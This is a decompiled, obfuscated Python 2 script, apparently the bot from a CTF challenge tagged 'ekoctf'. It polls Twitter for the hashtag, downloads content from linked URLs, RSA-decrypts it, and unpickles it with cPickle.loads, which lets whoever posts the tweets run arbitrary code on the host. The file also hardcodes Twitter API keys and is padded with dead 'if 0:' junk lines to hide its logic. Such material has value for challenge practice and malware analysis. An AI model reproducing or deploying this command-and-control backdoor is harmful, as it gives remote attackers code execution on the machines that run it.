# Embedded file name: ekobot_final.py
import os
import sys
import httplib2
import cPickle
from Crypto.PublicKey import RSA
from base64 import b64decode
from twython import Twython
if 0:
    i11iIiiIii
OO0o = 'ekoctf'
if 0:
    Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o
if len(sys.argv) != 2:
    os._exit(0)
    if 0:
        IiII1IiiIiI1 / iIiiiI1IiI1I1
o0OoOoOO00 = sys.argv[1]
if 0:
    OOOo0 / Oo - Ooo00oOo00o.I1IiI
o0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'
iIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'
if 0:
    iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI

def o0oO0():
    oo00 = 0
    if os.path.isfile(o0OoOoOO00):
        try:
            o00 = open(o0OoOoOO00, 'r')
            oo00 = int(o00.readline(), 10)
        except:
            oo00 = 0

    return oo00
    if 0:
        II1ii - o0oOoO00o.ooO0OO000o + ii1II11I1ii1I.ooO0OO000o - iI1Ii11111iIi


def oo(twid):
    try:
        o00 = open(o0OoOoOO00, 'w')
        o00.write(str(twid))
    except:
        if 0:
            oO0o0ooO0 - OO0O0O - IiII1IiiIiI1.ii1II11I1ii1I * iiIIIII1i1iI * ii1I
        if 0:
            ii1II11I1ii1I


def oo00000o0(url):
    I11i1i11i1I = httplib2.Http('')
    Iiii, OOO0O = I11i1i11i1I.request(url, 'GET')
    if Iiii.status == 200:
        try:
            if Iiii['content-type'][0:10] == 'text/plain':
                return OOO0O
            return 'Err'
        except:
            return 'Err'

    else:
        return url
        if 0:
            o0oOoO00o


def IiI1i(cipher_text):
    try:
        OOo0o0 = RSA.importKey(open('ekobot.pem').read())
        O0OoOoo00o = b64decode(cipher_text)
        iiiI11 = OOo0o0.decrypt(O0OoOoo00o)
        return iiiI11
    except Exception as OOooO:
        print str(OOooO)
        return 'Err'
        if 0:
            OOOo0 + Oo / ii1II11I1ii1I * iiiii


II111iiii = Twython(o0OOO, iIiiiI, oauth_version=2)
II = II111iiii.obtain_access_token()
II111iiii = Twython(o0OOO, access_token=II)
if 0:
    Oo % ii1I
oo00 = o0oO0()
o0oOo0Ooo0O = II111iiii.search(q='#' + OO0o, rpp='250', result_type='mixed', since_id=oo00)
if 0:
    I1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o
for OooO0OO in o0oOo0Ooo0O['statuses']:
    if OooO0OO['id'] > oo00:
        oo00 = OooO0OO['id']
        if 0:
            ooO0OO000o
    iii11iII = 0
    try:
        for i1I111I in OooO0OO['entities']['hashtags']:
            if i1I111I['text'] == OO0o:
                iii11iII = 1

        if iii11iII == 1:
            for i11I1IIiiIi in OooO0OO['entities']['urls']:
                if os.fork() == 0:
                    IiIiIi = IiI1i(oo00000o0(i11I1IIiiIi['url']))
                    if IiIiIi[0:5] == 'eko11':
                        cPickle.loads(IiIiIi[5:])
                    os._exit(0)
                    if 0:
                        iii1II11ii.Oo.iIiiiI1IiI1I1.ii1I

    except Exception as OOooO:
        print str(OOooO)
        if 0:
            ii1II11I1ii1I + ooO0OO000o % i11iIiiIii.o0oOoO00o - IiII1IiiIiI1

oo(oo00)